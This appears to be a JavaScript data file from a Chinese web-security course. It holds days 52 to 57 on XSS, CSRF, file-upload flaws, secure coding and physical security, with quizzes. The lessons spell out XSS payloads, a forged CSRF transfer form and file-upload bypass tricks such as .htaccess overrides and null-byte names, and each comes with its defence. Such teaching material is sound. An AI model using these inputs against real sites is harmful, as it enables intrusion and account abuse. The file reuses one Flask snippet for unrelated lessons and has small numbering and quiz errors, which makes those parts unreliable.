## 一、XSS分类再梳理
\`\`\`
XSS三大类型：
① 反射型 (Reflected XSS)：
   恶意脚本在URL参数中 → 服务器回显 → 浏览器执行
   触发方式：诱导用户点击恶意链接
   示例：/search?q=<script>alert(1)</script>
② 存储型 (Stored/Persistent XSS)：
   恶意脚本存储在服务器端 → 其他用户访问页面时执行
   触发方式：受害者访问正常页面
   示例：评论中插入<script>，存入数据库，所有人看到都触发
③ DOM型 (DOM-based XSS)：
   恶意脚本在客户端执行 → 不经过服务器
   触发方式：URL Hash/参数被JS不安全处理
   示例：document.write(location.hash)
\`\`\`
### 1.1 危害等级
| XSS类型 | 危害 | 传播 | 检测难度 |
|---------|------|------|---------|
| 存储型 | ⚠️ 最高 | 自动传播 | 一般 |
| 反射型 | ⚠️ 中 | 需要点击 | 容易 |
| DOM型 | ⚠️ 中高 | 需要点击 | 困难（WAF看不见） |
| mXSS | ⚠️ 高 | 取决于类型 | 困难 |
---
## 二、DOM XSS深度分析
### 2.1 Sink和Source
\`\`\`
DOM XSS = Source → 危险的数据流 → Sink
Source (输入源)：
  · location / location.href / location.search / location.hash
  · document.URL / document.documentURI
  · document.referrer
  · window.name
  · postMessage data
  · Cookie
Sink (危险输出点)：
  · innerHTML / outerHTML
  · document.write() / document.writeln()
  · eval() / setTimeout() / setInterval()
  · location.href / location.replace()
  · document.createElement() + appendChild()
  · jQuery html() / append() 等
示例：
  // Source: location.hash  
  // Sink: innerHTML
  document.getElementById("content").innerHTML = 
      decodeURIComponent(location.hash.slice(1));
  攻击URL: https://example.com/page#<img src=x onerror=alert(1)>
\`\`\`
### 2.2 常见DOM XSS模式
\`\`\`
模式1：innerHTML注入
  element.innerHTML = userInput;  → 危险！
  修复：element.textContent = userInput;
模式2：eval注入
  eval('var x = ' + location.hash.slice(1));
  修复：JSON.parse(userInput);
模式3：重定向注入
  location.href = getParameter('redirect');
  → javascript:alert(1)
  修复：验证URL协议为http/https
模式4：jQuery危险用法
  $(userInput)  → 如果input是"<img src=x onerror=...>"
  修复：$(document.createTextNode(userInput))
模式5：postMessage不安全处理
  window.addEventListener('message', function(e) {
    document.getElementById('data').innerHTML = e.data;
  });
  → 任何站点都可以发消息
  修复：验证e.origin
\`\`\`
---
## 三、mXSS（突变XSS）
### 3.1 mXSS原理
\`\`\`
mXSS (Mutation XSS)：
浏览器解析HTML → 构建DOM → 序列化回HTML → 与原始不同！
示例：
  <listing><img src=1 onerror=alert(1)></listing>`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q52-1","question":"DOM型XSS与反射型的区别？","options":["无区别", "DOM型全程在浏览器端，不经过服务器", "反射型更危险", "DOM型仅IE中"],"correctIndex":1,"explanation":"DOM型=纯客户端，Payload不发送服务器。"},{"id":"q52-2","question":"CSP nonce绕过什么？","options":["所有脚本", "static script需携带正确nonce值", "CSS", "图片"],"correctIndex":1,"explanation":"nonce=一次性随机数，script标签必须匹配。"},{"id":"q52-3","question":"mXSS(mutation XSS)发生在？","options":["服务器", "浏览器解析HTML时DOM树变异", "数据库", "网络传输"],"correctIndex":1,"explanation":"mXSS利用innerHTML等DOM操作时HTML变异。"},{"id":"q52-4","question":"React自动防御XSS吗？","options":["不防御", "默认JSX转义{变量}内容", "仅类组件", "仅函数组件"],"correctIndex":1,"explanation":"React JSX默认进行HTML转义。"},{"id":"q52-5","question":"HttpOnly防XSS的机制？","options":["过滤脚本", "禁止JavaScript读取该Cookie", "加密Cookie", "隐藏Cookie"],"correctIndex":1,"explanation":"HttpOnly=doucment.cookie无法读取。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[52]||[],
});
allDays.push({
  id:'day-53',day:53,week:8,title:'CSRF攻击（应用安全）',
  objectives:['CSRF攻击原理回顾','Anti-CSRF Token深入','SameSite Cookie机制'],
  content:`# Day 53：CSRF攻击
### 1.1 攻击条件
\`\`\`
CSRF攻击成功的必要条件：
① 用户在目标网站已登录（Cookie有效）
② 目标网站的请求参数可预测
③ 攻击者能诱导用户触发请求
经典攻击流程：
  受害者                  目标网站 www.bank.com
  1. 登录银行网站 ─────────────→ 获得Session Cookie
  2. 访问恶意页面（或点击链接）
      ← 返回恶意HTML:
      <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="10000">
      </form>
      <script>document.forms[0].submit()</script>
  3. 浏览器自动提交表单（带Cookie）
     ─────────────────→ POST /transfer
                         to=attacker&amount=10000
                         Cookie: session=abc123
  4. 处理请求 ──→ 转账成功！（认为是合法请求）
\`\`\`
### 1.2 常见受影响操作
| 操作类型 | 风险场景 |
|----------|---------|
| 账号修改 | 改密码、改邮箱、改手机号 |
| 资金操作 | 转账、支付、提现 |
| 权限变更 | 添加管理员、修改权限 |
| 内容发布 | 发帖、发私信、评论 |
| 设置修改 | 改安全设置、关闭2FA |
---
## 二、Anti-CSRF Token深入
### 2.1 Token实现原理
\`\`\`
完整的CSRF Token流程：
        Client                        Server
          │                              │
          │ 1. GET /transfer-form        │
          │ ───────────────────────→    │
          │                              │  生成随机Token
          │                              │  存入Session
          │    2. 返回表单(含隐藏Token)     │
          │ ←─────────────────────────  │
          │    <input type="hidden"      │
          │     name="csrf_token"        │
          │     value="a8f3b2c1">       │
          │                              │
          │ 3. POST /transfer            │
          │    csrf_token=a8f3b2c1       │
          │    + Cookie(Session)         │
          │ ───────────────────────→    │
          │                              │  比较POST中的Token
          │                              │  与Session中的Token
          │                              │  ✓ 匹配 → 处理请求
          │    4. 确认结果               │
          │ ←─────────────────────────  │
Token安全要求：
  ✅ 随机性：至少128位熵的安全随机数
  ✅ 绑定：Token与用户Session绑定
  ✅ 一次性：每个Session生成新Token，或每次请求更新
  ✅ 保密：不在URL中传递，不在Referer中泄露
\`\`\`
### 2.2 常见Token实现错误
\`\`\`
❌ 错误1：Token可预测
   csrf_token = md5(user_id)  → 攻击者可计算
❌ 错误2：Token范围过宽
   同一Token在所有操作中重用 → 泄露一个令牌全受影响
❌ 错误3：Token比较不严格
   if csrf_token in user_input:  → 空Token也通过
❌ 错误4：GET请求携带Token
   GET /delete?id=1&token=xxx  → Token在URL/Referer日志泄露
❌ 错误5：Token在Cookie中双重提交但无验证
   → 攻击者可以为目标域名设置Cookie (Cookie Tossing)
✅ 正确实现：
   · 安全随机数生成 (SecureRandom/crypto.randomBytes)
   · 服务器端比较（恒定时间）
   · 每个用户独立的Token
   · POST/PUT/DELETE类请求需Token`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q53-1","question":"CSRF Token应该满足的特性？","options":["固定不变", "随机、不可预测、绑定Session", "可公开", "可重复使用"],"correctIndex":1,"explanation":"Token必须随机且不可预测。"},{"id":"q53-2","question":"SameSite=Lax的行为？","options":["阻止所有跨站请求", "顶级导航GET请求可携带Cookie", "所有请求均可", "仅POST可携带"],"correctIndex":1,"explanation":"Lax=导航GET允许,POST/AJAX不允许。"},{"id":"q53-3","question":"SSRF(Server-Side Request Forgery)指？","options":["客户端请求伪造", "服务器端请求伪造(攻击内网)", "跨站请求", "中间人"],"correctIndex":1,"explanation":"SSRF诱导服务器发请求到内部系统。"},{"id":"q53-4","question":"Referer验证防CSRF的局限？","options":["无局限", "某些环境可能不发送Referer头", "太复杂", "性能低"],"correctIndex":1,"explanation":"Referer可能被隐私设置或代理移除。"},{"id":"q53-5","question":"双提交Cookie防御CSRF的原理？","options":["服务端存CSRF Token", "Cookie中存随机值+请求体中相同值,攻击者无法读取Cookie"],"correctIndex":1,"explanation":"攻击者无法读取跨域Cookie中的随机值。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[53]||[],
});
allDays.push({
  id:'day-54',day:54,week:8,title:'文件上传漏洞（应用安全）',
  objectives:['文件上传漏洞概述','上传绕过技术全景','文件类型检测绕过'],
  content:`# Day 54：文件上传漏洞
## 一、文件上传漏洞概述
### 1.1 攻击路径
\`\`\`
文件上传攻击完整流程：
  攻击者上传恶意文件 → 服务器存储 → 攻击者访问执行 → 获得控制权
三个关键步骤：
  ① 绕过文件类型/大小检查
  ② 文件被存储到Web可访问的目录
  ③ 攻击者能够访问并触发执行
风险等级：
  · 直接上传WebShell → 严重！远程代码执行
  · 上传HTML/JS → 高危，XSS攻击
  · 上传恶意文档 → 中高，钓鱼/恶意宏
\`\`\`
### 1.2 检测防护层次
\`\`\`
服务器端检测层次（由浅到深）：
Layer 1: 前端JS验证 → 极易绕过（Burp拦截改请求）
Layer 2: Content-Type检查 → 容易绕过（修改MIME头）
Layer 3: 文件扩展名检查 → 黑名单易绕过
Layer 4: 文件头(Magic Bytes)检查 → 较难但可伪造
Layer 5: 文件内容分析 → 较强，需深度检测
Layer 6: 沙箱行为分析 → 最强，但有性能开销
\`\`\`
---
## 二、上传绕过技术全景
### 2.1 前端JS验证绕过
\`\`\`javascript
// 前端验证（形同虚设！）
function validate() {
  var ext = file.value.split('.').pop();
  if (ext != 'jpg' && ext != 'png') {
    alert('只允许上传图片！');
    return false;
  }
}
绕过方法：
  ① 禁用JavaScript
  ② Burp Suite拦截请求，修改文件名
  ③ 浏览器开发者工具修改JS代码
  ④ 直接构造HTTP请求（curl/Python requests）
\`\`\`
### 2.2 Content-Type绕过
\`\`\`
检查Content-Type请求头：
  if ($_FILES['file']['type'] != 'image/jpeg') 
      die('不是图片');
绕过：
  抓包修改 Content-Type: application/x-php → image/jpeg
  Content-Type只是HTTP头 → 客户端可控 → 不可信！
\`\`\`
### 2.3 黑名单绕过
\`\`\`
黑名单：禁止 .php, .asp, .aspx, .jsp
绕过方式：
  ① 大小写：.Php, .pHp
  ② 双扩展：.php.jpg (Apache解析顺序漏洞)
  ③ 特殊扩展：
     · .php5, .phtml, .pht, .phps, .phar (PHP)
     · .asp;.jpg (IIS解析漏洞)
     · .asa, .cer, .cdx (IIS)
     · .jspx, .jspf (Tomcat)
  ④ 点/空格/斜杠：
     · shell.php. → Apache变为.php
     · shell.php%00.jpg → 空字节截断
     · shell.php/. → Nginx配置错误
  ⑤ Windows特性：
     · shell.php::$DATA → NTFS流
     · shell.php. .jpg → 末尾点/空格
\`\`\`
### 2.4 .htaccess绕过
\`\`\`
如果服务器允许上传.htaccess：
  上传 .htaccess 文件内容：
  AddType application/x-httpd-php .jpg
  → 所有.jpg文件被PHP解析器执行
  或：
  <FilesMatch "evil.jpg">
    SetHandler application/x-httpd-php`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q54-1","question":"文件上传漏洞最常见危害？","options":["仅存储", "上传Webshell获得服务器控制权", "仅下载", "仅查看"],"correctIndex":1,"explanation":"Webshell=服务器远程控制。"},{"id":"q54-2","question":"文件白名单指的是？","options":["IP白名单", "允许的文件扩展名列表", "用户白名单", "域名白名单"],"correctIndex":1,"explanation":"仅允许指定安全扩展名。"},{"id":"q54-3","question":".php5/.phtml绕过基于什么？","options":["大小写", "服务端配置允许的PHP扩展名范围", "编码", "压缩"],"correctIndex":1,"explanation":"利用Apache/nginx配置允许的备用扩展名。"},{"id":"q54-4","question":"条件竞争上传利用什么？","options":["网络速度", "检查和存储之间存在时间窗口", "CPU", "内存"],"correctIndex":1,"explanation":"检查通过后→存储前→另一个请求触发执行。"},{"id":"q54-5","question":"安全上传文件存储推荐？","options":["Web根目录", "Web根目录外+随机文件名+无执行权限", "/tmp", "数据库"],"correctIndex":1,"explanation":"上传目录不收在Web可访问路径下。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[54]||[],
});
allDays.push({
  id:'day-55',day:55,week:8,title:'安全编码实践（应用安全）',
  objectives:['安全开发生命周期(SDL)','输入验证策略','输出编码规范'],
  content:`# Day 55：安全编码实践
## 一、安全开发生命周期(SDL)
### 1.1 Microsoft SDL
\`\`\`
Microsoft Security Development Lifecycle (7阶段)：
  ┌────────┐    ┌────────┐    ┌────────┐    ┌────────┐
  │ 1.培训  │ → │ 2.需求  │ → │ 3.设计  │ → │ 4.实现  │
  └────────┘    └────────┘    └────────┘    └────────┘
       ↑                                          │
       │         ┌────────┐    ┌────────┐    ┌───▼────┐
       └─────────│6.响应  │ ← │5.验证  │ ← │4.发布  │
                 └────────┘    └────────┘    └────────┘
各阶段要点：
  1. 培训：核心安全培训
  2. 需求：安全需求 + 质量门禁 + 隐私风险评估
  3. 设计：威胁建模 + 攻击面分析
  4. 实现：安全编码规范 + 静态分析 + 代码审查
  5. 验证：动态分析 + 模糊测试 + 渗透测试
  6. 发布：事件响应计划 + 最终安全评审
  7. 响应：执行事件响应计划
\`\`\`
### 1.2 OWASP SAMM
\`\`\`
SAMM (Software Assurance Maturity Model)：
五个业务功能：
  治理     → 策略与指标、合规管理、教育培训
  设计     → 威胁建模、安全需求、安全架构
  实现     → 安全构建、安全部署、缺陷管理
  验证     → 架构评估、安全测试、需求驱动测试
  运营     → 事件管理、环境加固、运营管理
每个实践3级成熟度：
  L1：基础理解、临时执行
  L2：流程定义、效率提升
  L3：全面掌握、持续优化
\`\`\`
---
## 二、输入验证策略
### 2.1 输入验证原则
\`\`\`
✅ 黄金法则：所有输入都是不可信的！
验证策略：
  1. 白名单验证（首选）：只允许已知安全的输入
     例：角色字段只允许 "user", "admin", "manager"
  2. 黑名单过滤（辅助）：拒绝已知危险的输入
     例：过滤 <script>, SELECT, DROP 等关键字
     缺点：总有遗漏 → 绕过
  3. 格式验证：严格匹配预期格式
     例：邮箱 ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$
     例：手机号 1[3-9]\\d{9}
验证位置：
  服务端强制验证 + 前端可选验证（UX目的）
  永远不能只信任前端验证！
\`\`\`
### 2.2 验证策略矩阵
\`\`\`
┌──────────────┬──────────────┬──────────────────────┐
│   数据类型    │   验证方式    │         示例          │
├──────────────┼──────────────┼──────────────────────┤
│ 字符串/文本   │ 长度+格式白名单 │ 用户名: [a-z0-9_]{3,20} │
│ 数字/ID      │ 类型+范围     │ user_id: integer, >0│
│ 日期         │ 格式+范围     │ YYYY-MM-DD, 合法日期  │
│ 枚举/选项     │ 白名单匹配    │ 来自预定义列表        │
│ 邮箱/手机     │ 正则验证      │ 标准格式              │
│ 文件上传      │ 类型+大小+头  │ 多重检查              │
│ JSON/XML     │ Schema验证   │ JSON Schema/XSD     │
│ URL          │ 协议+域名白名单│ http(s)://allowed.com│
└──────────────┴──────────────┴──────────────────────┘
验证时机：
  · 接收时验证（最早拦截）
  · 使用时验证（防御二次注入）
  · 输出时编码（最后一层防御）
\`\`\`
---
## 三、输出编码规范
### 3.1 上下文感知编码
\`\`\`
输出编码必须根据上下文选择：
┌──────────────────┬──────────────────────────────┐
│   输出上下文       │          编码方式             │
├──────────────────┼──────────────────────────────┤`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q55-1","question":"SDL的第一步是？","options":["代码审计", "安全培训", "渗透测试", "部署"],"correctIndex":1,"explanation":"SDL=安全培训→需求→设计→实现→验证→发布→响应。"},{"id":"q55-2","question":"SAST代表？","options":["动态测试", "静态应用安全测试(白盒)", "交互测试", "人工审计"],"correctIndex":1,"explanation":"SAST=Static Application Security Testing。"},{"id":"q55-3","question":"DevSecOps核心理念？","options":["安全是最后一步", "安全融入开发运维全流程(左移)", "不要安全", "外包安全"],"correctIndex":1,"explanation":"DevSecOps=安全左移(Shift Left)。"},{"id":"q55-4","question":"bcrypt相比SHA-256存密码的优势？","options":["更快", "内置盐值+可调迭代次数(成本因子)", "更短", "更简单"],"correctIndex":1,"explanation":"bcrypt专为密码存储设计:自动加盐+成本因子。"},{"id":"q55-5","question":"错误处理的安全最佳实践？","options":["返回详细错误", "对外统一返回通用错误,对内记录详细", "不返回任何信息", "只记录不返回"],"correctIndex":1,"explanation":"防止信息泄露:对用户友好模糊,日志详细。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[55]||[],
});
allDays.push({
  id:'day-56',day:56,week:8,title:'八周总结与测验（应用安全）',
  objectives:['第八周知识地图','每日精华回顾','核心对比表汇总'],
  content:`# Day 56：第八周总结与测验
\`\`\`
                    应用安全知识体系
                    ┌─────────────┐
                    │  OWASP Top 10│
                    │   (Day 50)    │
                    └──────┬──────┘
                           │
    ┌──────────────────────┼──────────────────────┐
    │                      │                      │
┌───▼────┐          ┌─────▼─────┐          ┌────▼─────┐
│ SQL注入 │          │    XSS    │          │   CSRF   │
│(Day 51)│          │  (Day 52)  │          │ (Day 53) │
├────────┤          ├───────────┤          ├──────────┤
│·Union  │          │·反射/存储/DOM│        │·Token   │
│·Boolean│          │·DOM XSS深入│          │·SameSite│
│·Time   │          │·mXSS      │          │·SSRF    │
│·二次注入│          │·CSP绕过   │          │         │
└───┬────┘          └─────┬─────┘          └────┬─────┘
    │                      │                      │
    └──────────────────────┼──────────────────────┘
                           │
            ┌──────────────┼──────────────┐
            │              │              │
      ┌─────▼─────┐ ┌─────▼─────┐ ┌─────▼─────┐
      │ 文件上传   │ │ 安全编码   │ │  总结测验  │
      │ (Day 54)  │ │ (Day 55)  │ │ (Day 56)  │
      ├───────────┤ ├───────────┤ ├───────────┤
      │·绕过技术   │ │·SDL流程   │ │·知识回顾  │
      │·图片马    │ │·输入验证   │ │·模拟考试  │
      │·LFI/RFI  │ │·SAST/DAST│ │           │
      │·安全上传   │ │·供应链安全 │ │           │
      └───────────┘ └───────────┘ └───────────┘
\`\`\`
---
### Day 50：Web安全基础
\`\`\`
核心掌握：
  · OWASP Top 10 (2021)：A01失效访问控制登顶
  · 关键安全头：CSP, HSTS, X-Frame-Options, X-Content-Type-Options
  · Cookie属性：Secure + HttpOnly + SameSite
  · CORS配置：不能Origin:* + Credentials:true
\`\`\`
### Day 51：SQL注入深入
\`\`\`
核心掌握：
  · 盲注分类：Boolean(页面差异) vs Time-based(时间延迟)
  · 二次注入：存储时转义≠安全，取出再拼接仍危险
  · WAF绕过：编码+注释+大小写+等价函数
  · 根本防御：参数化查询(PreparedStatement)
\`\`\`
### Day 52：XSS深入
\`\`\`
核心掌握：
  · DOM XSS：Source→Sink，不经过服务器
  · mXSS：浏览器HTML解析/序列化的不一致性
  · CSP绕过：JSONP、AngularJS、文件上传
  · Trusted Types：浏览器原生防御机制
\`\`\`
### Day 53：CSRF攻击
\`\`\`
核心掌握：
  · 防御层次：SameSite Cookie + Anti-CSRF Token + Referer验证
  · XSS存在时CSRF防御失效
  · SSRF让服务器发起请求，攻击内网
  · GET请求不应有副作用
\`\`\`
### Day 54：文件上传漏洞
\`\`\`
核心掌握：
  · 安全上传=白名单扩展名+魔数检查+随机命名+非Web目录
  · 绕过技术：大小写/双扩展/特殊扩展/.htaccess/图片马
  · LFI：include用户输入→任意文件读取
  · RFI：allow_url_include→远程代码执行
\`\`\`
### Day 55：安全编码实践
\`\`\`
核心掌握：
  · 微软SDL：培训→需求→设计→实现→验证→发布→响应
  · 输入验证：白名单优先，服务端强制`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q56-1","question":"OWASP Top 10 2021排名第三？","options":["XSS", "Injection注入", "SSRF", "CSRF"],"correctIndex":1,"explanation":"Injection排名第三。"},{"id":"q56-2","question":"防御XSS最有效手段？","options":["WAF", "上下文输出编码", "HTTPS", "Cookie安全属性"],"correctIndex":1,"explanation":"输出编码是XSS的根本防御。"},{"id":"q56-3","question":"SameSite=Lax允许什么？","options":["所有跨站", "顶级导航GET", "POST AJAX", "PUT"],"correctIndex":1,"explanation":"Lax允许顶级导航GET请求。"},{"id":"q56-4","question":"文件上传防御最佳实践？","options":["允许所有文件", "白名单扩展名+内容检测+非Web目录存储", "仅检查大小", "仅检查名称"],"correctIndex":1,"explanation":"多层防御:扩展名+MIME+内容+存储位置。"},{"id":"q56-5","question":"SDL七个阶段第一步？","options":["设计", "实现", "培训", "测试"],"correctIndex":2,"explanation":"安全意识培训(Security Training)。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[56]||[],
});
allDays.push({
  id:'day-57',day:57,week:9,title:'物理安全概述（物理安全）',
  objectives:['物理安全在信息安全中的定位','分层物理防护模型','安全区域分级'],
  content:`# Day 57：物理安全概述
## 一、物理安全在信息安全中的定位
### 1.1 物理安全 = 信息安全基础
\`\`\`
▸ 如果你的服务器被偷走了 → 加密、防火墙全部失效
▸ 如果有人进入机房直接操作 → 网络边界形同虚设
▸ 如果火灾烧毁数据中心 → 所有业务中断
物理安全是信息安全防御的第一道防线！
\`\`\`
### 1.2 CIA与物理安全
| CIA要素 | 物理安全贡献 |
|---------|-------------|
| 机密性 | 防止未授权人员接触设备/介质 |
| 完整性 | 防止物理篡改、硬件后门植入 |
| 可用性 | 防火、防水、电力保障 → 服务不中断 |
---
## 二、分层物理防护模型
### 2.1 同心圆防护模型
\`\`\`
┌──────────────────────────────────────┐
│         Perimeter 边界（最外层）       │
│   围墙、栅栏、大门、车牌识别           │
│  ┌────────────────────────────────┐  │
│  │    Building 建筑（第二层）        │  │
│  │  门禁、保安、闭路电视(CCTV)       │  │
│  │  ┌──────────────────────────┐  │  │
│  │  │  Floor 楼层（第三层）        │  │  │
│  │  │  楼层门禁、接待前台           │  │  │
│  │  │  ┌──────────────────────┐ │  │  │
│  │  │  │ Room 机房（第四层）      │ │  │  │
│  │  │  │ 机房门禁、双重认证       │ │  │  │
│  │  │  │  ┌─────────────────┐  │ │  │  │
│  │  │  │  │ Rack 机柜(第五层) │  │ │  │  │
│  │  │  │  │  机柜锁、监控     │  │ │  │  │
│  │  │  │  │  ┌───────────┐  │  │ │  │  │
│  │  │  │  │  │ 设备(第六层)│  │  │ │  │  │
│  │  │  │  │  │ 防篡改贴纸  │  │  │ │  │  │
│  │  │  │  │  └───────────┘  │  │ │  │  │
│  │  │  │  └─────────────────┘  │ │  │  │
│  │  │  └──────────────────────┘ │  │  │
│  │  └──────────────────────────┘  │  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘
\`\`\`
### 2.2 各层防护措施
| 层次 | 典型措施 | 关键设备 |
|------|---------|---------|
| 边界 | 围墙、栅栏、岗亭 | 车牌识别、红外探测器 |
| 建筑 | 门禁系统、安检 | 读卡器、金属探测门 |
| 楼层 | 楼层权限隔离 | 电梯刷卡控制 |
| 机房 | 双重认证进入 | 生物识别+IC卡 |
| 机柜 | 机柜锁、监控 | 电子锁、温湿度传感器 |
| 设备 | 防篡改、标签 | 防拆标签、资产标签 |
---
## 三、安全区域分级
### 3.1 四级区域模型
\`\`\`
┌──────────┬──────────────┬────────────────────────────┐
│   级别    │     名称      │           示例             │
├──────────┼──────────────┼────────────────────────────┤
│  Zone 0  │ 公共区域      │ 大厅、停车场、访客区       │
│  Zone 1  │ 办公区域      │ 普通办公室、会议室         │
│  Zone 2  │ 限制区域      │ 机房、实验室、研发区       │
│  Zone 3  │ 高安全区域    │ 核心网络设备区、密码机区    │
│  Zone 4  │ 隔离区域      │ 涉密信息处理区、灾备中心    │
└──────────┴──────────────┴────────────────────────────┘
\`\`\`
---
## 四、物理安全威胁分类
| 类别 | 威胁示例 |
|------|---------|
| 自然灾害 | 火灾、洪水、地震、台风 |
| 人为意外 | 施工挖断电缆、漏水、误操作 |
| 人为恶意 | 盗窃、破坏、尾随进入、社会工程 |
| 技术威胁 | 电磁泄露(TEMPEST)、硬件后门、旁路攻击 |
| 基础设施 | 停电、空调故障、管道破裂 |
---
## 五、物理安全标准与法规
\`\`\`
ISO/IEC 27002 §11：物理与环境安全`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
